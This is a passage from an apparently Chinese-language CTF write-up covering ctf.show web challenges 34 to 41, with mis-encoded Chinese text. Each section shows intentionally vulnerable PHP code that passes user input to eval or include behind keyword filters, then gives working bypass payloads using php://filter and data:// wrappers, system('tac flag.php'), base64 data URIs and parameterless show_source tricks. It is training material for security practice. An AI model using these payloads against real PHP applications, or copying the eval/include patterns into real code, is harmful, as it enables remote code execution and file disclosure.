</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|\:|</span><span class="se">\&#34;</span><span class="s2">/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>å±è”½çš„å…³é”®è¯ /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|:|&quot;</p>
<p>ç»§ç»­ä½¿ç”¨includeæ„é€ payloadï¼š</p>
<blockquote>
<p>url/?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</p>
<p>æˆ–è€…</p>
<p>url/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,<?php%20system("tac%20flag.php")?></p></blockquote>
<h4 id="web35">web35<a hidden class="anchor" aria-hidden="true" href="#web35">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 04:21:23
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|\:|</span><span class="se">\&#34;</span><span class="s2">|\&lt;|\=/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>å±è”½å…³é”®è¯ /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|:|&quot;|&lt;|=</p>
<p>ç»§ç»­ä½¿ç”¨includeæ„é€ payloadï¼šï¼ˆwsmè¿˜èƒ½ç§’ï¼‰</p>
<blockquote>
<p>url/?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</p>
<p>æˆ–è€…</p>
<p>url/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,<?php%20system("tac%20flag.php")?></p></blockquote>
<h4 id="web36">web36<a hidden class="anchor" aria-hidden="true" href="#web36">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm">\# -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm">\# @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm">\# @Date:  2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm">\# @Last Modified by:  h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm">\# @Last Modified time: 2020-09-04 04:21:16
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">\# @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">\# @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">  <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|\:|</span><span class="se">\&#34;</span><span class="s2">|\&lt;|\=|\/|[0-9]/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">  
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">  <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>å±è”½å…³é”®å­— /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|:|&quot;|&lt;|=|/|[0-9]</p>
<p>ä¸æ˜¯å“¥ä»¬ï¼Œæ•°å­—ä¹Ÿè¦å±è”½ï¼Œé‚£æˆ‘æ”¹ä¸€ä¸‹ä¸å°±å¥½äº†</p>
<p>ç»§ç»­ä½¿ç”¨includeæ„é€ payloadï¼š</p>
<blockquote>
<p>url/?c=include$_GET[m]?&gt;&amp;m=php://filter/convert.base64-encode/resource=flag.php</p>
<p>æˆ–è€…</p>
<p>url/?c=include$_GET[m]?&gt;&amp;m=data://text/plain,<?php%20system("tac%20flag.php")?></p></blockquote>
<h4 id="web37">web37<a hidden class="anchor" aria-hidden="true" href="#web37">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 05:18:55
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="c1">//flag in flag.php
</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1"></span><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">include</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>ä¸æ˜¯å“¥ä»¬ï¼Œæ€ä¹ˆè¿˜æ˜¯æ–‡ä»¶åŒ…å«</p>
<p>payloadï¼š</p>
<blockquote>
<p>?c=data://text/plain,<?php system("tac fla*.php")?></p>
<p>æˆ–è€…</p>
<p>?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=</p></blockquote>
<h4 id="web38">web38<a hidden class="anchor" aria-hidden="true" href="#web38">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 05:23:36
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="c1">//flag in flag.php
</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1"></span><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|php|file/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">include</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>payload:</p>
<blockquote>
<p>?c=data://text/plain,<?=system("tac%20fla*")?></p>
<p>æˆ–è€…</p>
<p>?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=</p></blockquote>
<h4 id="web39">web39<a hidden class="anchor" aria-hidden="true" href="#web39">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 06:13:21
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="c1">//flag in flag.php
</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1"></span><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">include</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34;.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿™é‡Œä¼šåœ¨æˆ‘ä»¬ä¼ å…¥çš„cåé¢æ‹¼æ¥ä¸€æ®µ.php</p>
<p>æˆ‘ä»¬åªéœ€è¦åœ¨åŠ å…¥<?php ?>é‚£ä¹ˆphpå°±åªä¼šæ‰§è¡Œä¸­é—´çš„ä»£ç ï¼Œåé¢çš„å†…å®¹ä¸ä¼šæ‰§è¡Œ</p>
<p>æ•…payloadï¼š</p>
<blockquote>
<p>?c=data://text/plain,<?php system("tac fla*.php")?></p></blockquote>
<h4 id="web40">web40<a hidden class="anchor" aria-hidden="true" href="#web40">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 06:03:36
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[0-9]|\~|\`|\@|\#|</span><span class="se">\\</span><span class="s2">$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\{|\[|\]|\}|\:|\&#39;|</span><span class="se">\&#34;</span><span class="s2">|\,|\&lt;|\.|\&gt;|\/|\?|</span><span class="se">\\\\</span><span class="s2">/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>å±è”½å…³é”®è¯ /[0-9]|~|`|@|#|\$|%|^|&amp;|*|\ï¼ˆ|\ï¼‰|-|=|+|{|[|]|}|:|'|&quot;|,|&lt;|.|&gt;|/|?|\\</p>
<p>è¿™é‡Œè¦ä½¿ç”¨æ— å‚å‘½ä»¤æ‰§è¡Œ</p>
<p>payloadï¼š</p>
<blockquote>
<p>?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</p></blockquote>
<p>å…³äºæ— å‚å‘½ä»¤æ‰§è¡Œçš„ä¸€äº›è§£é‡Š</p>
<p><img alt="image-20241109165447576" loading="lazy" src="../assets/202411091654772.png"></p>
<h4 id="web41">web41<a hidden class="anchor" aria-hidden="true" href="#web41">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: ç¾½
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:31:22
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 22:40:07
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: 1341963450@qq.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctf.show
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/i&#39;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;echo(</span><span class="si">$c</span><span class="s2">);&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>è¿‡æ»¤å†…å®¹ï¼š<code>/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/i</code></p>
<p>è¿™ä¸ªé¢˜è¿‡æ»¤äº†<code>$ã€+ã€-ã€^ã€~</code>ä½¿å¾—<strong>å¼‚æˆ–è‡ªå¢å’Œå–å</strong>æ„é€ å­—ç¬¦éƒ½æ— æ³•ä½¿ç”¨ï¼ŒåŒæ—¶è¿‡æ»¤äº†å­—æ¯å’Œæ•°å­—ã€‚ä½†æ˜¯ç‰¹æ„ç•™äº†ä¸ªæˆ–<a href="https://so.csdn.net/so/search?q=%e8%bf%90%e7%ae%97%e7%ac%a6&amp;spm=1001.2101.3001.7020">è¿ç®—ç¬¦</a><code>|</code>ã€‚
æˆ‘ä»¬å¯ä»¥å°è¯•ä»asciiä¸º0-255çš„å­—ç¬¦ä¸­ï¼Œæ‰¾åˆ°æˆ–è¿ç®—èƒ½å¾—åˆ°æˆ‘ä»¬å¯ç”¨çš„å­—ç¬¦çš„å­—ç¬¦ã€‚</p>
<p>å¤§ä½¬çš„è„šæœ¬</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nv">$myfile</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="s2">&#34;rce_or.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nv">$contents</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="nv">$j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$j</span> <span class="o">&lt;</span><span class="mi">256</span> <span class="p">;</span> <span class="nv">$j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nv">$i</span><span class="o">&lt;</span><span class="mi">16</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">			<span class="nv">$hex_i</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="o">.</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$i</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">		<span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">			<span class="nv">$hex_i</span><span class="o">=</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$i</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nv">$j</span><span class="o">&lt;</span><span class="mi">16</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">			<span class="nv">$hex_j</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="o">.</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$j</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">		<span class="k">else</span><span class="p">{</span>
